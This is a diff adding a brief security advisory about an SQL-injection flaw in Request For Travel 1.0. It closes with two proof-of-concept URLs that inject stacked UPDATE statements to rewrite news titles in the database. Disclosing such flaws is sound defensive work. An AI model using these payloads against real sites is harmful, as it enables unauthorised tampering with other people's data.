@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/21536/info
+
+Request For Travel is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.
+
+Version 1.0 is vulnerable; other versions may also be affected.
+
+Change all News titles to "kro" -
+http://www.example.com/ProductDetails.asp?from=desc&mod=region&CID=-1&RID=-1&PID=-1;update%20gtsNews%20set%20NewsTitle='kro'--
+
+Change just the NewsId title to = "kro"
+http://www.example.com/ProductDetails.asp?from=desc&mod=region&CID=-1&RID=-1&PID=-1;update%20gtsNews%20set%20NewsTitle='kro'%20where%20NewsID=2-
